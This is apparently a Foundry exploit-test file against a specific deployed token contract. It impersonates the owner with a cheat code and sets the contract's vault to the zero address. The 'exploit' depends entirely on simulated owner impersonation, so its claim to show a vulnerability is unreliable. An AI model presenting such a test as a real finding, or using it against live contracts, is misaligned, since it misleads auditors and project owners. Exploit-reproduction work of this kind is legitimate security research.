pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ISapToken {
    function owner() external view returns (address);
    function setVault(address vault_) external returns (bool);
    function vault() external view returns (address);
    function mint(address account_, uint256 amount_) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x039639Ed22A7654f74C1B0017C9d0DF85C26B63B;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner and prank in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = ISapToken(TARGET).owner();

        // Impersonate the owner and set vault to zero address
        vm.prank(owner);
        ISapToken(TARGET).setVault(address(0));

        // Verify the vault is now zero address
        address vaultAfter = ISapToken(TARGET).vault();
        assertEq(vaultAfter, address(0), "Vault should be zero address");
        assertEq(vaultAfter, address(0), "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

